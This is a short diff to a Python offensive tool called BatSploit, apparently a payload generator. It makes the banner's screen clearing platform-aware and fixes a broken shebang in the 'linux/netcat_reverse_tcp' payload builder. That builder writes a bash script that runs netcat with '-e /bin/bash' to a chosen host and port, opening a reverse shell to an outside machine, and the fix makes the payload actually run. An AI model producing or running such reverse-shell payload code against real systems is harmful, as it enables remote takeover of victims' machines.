@@ -27,8 +27,10 @@ class BatSploit(object):
 		self.version = version
 	
 	def banner(self):
-		os.system("cls") # if windows
-		#os.system("clear") # if linux or mac
+		if self.platform == "Windows":
+			os.system("cls") # if windows
+		else:
+			os.system("clear") # if linux or mac
 		print ""
 		sys.stdout.write(colored("     _{___{__}\n", "white"))
 		sys.stdout.write(colored("    {_}      `\)\n", "white"))           
@@ -195,7 +197,7 @@ class BatSploit(object):
 				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
 		elif payload == 'linux/netcat_reverse_tcp':
 			# code
-			code = "!#/bin/bash\n"
+			code = "#!/bin/bash\n"
 			code += "nc %s %i -e /bin/bash &> dismown && clear"%(host, port)
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(code) # escreve o código no arquivo
